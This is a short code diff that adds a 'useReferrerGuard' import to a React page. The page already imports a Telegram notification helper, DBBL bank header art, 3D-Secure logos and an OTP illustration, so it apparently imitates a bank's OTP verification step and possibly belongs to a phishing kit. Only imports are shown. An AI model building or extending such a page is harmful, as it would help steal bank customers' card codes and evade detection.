@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import { useReferrerGuard } from "@/hooks/useReferrerGuard";
 import dbblHeader from "@/assets/dbbl-header.jpg";
 import secureLogos from "@/assets/3d-secure-logos.jpg";
 import otpIllustration from "@/assets/otp-illustration.jpg";
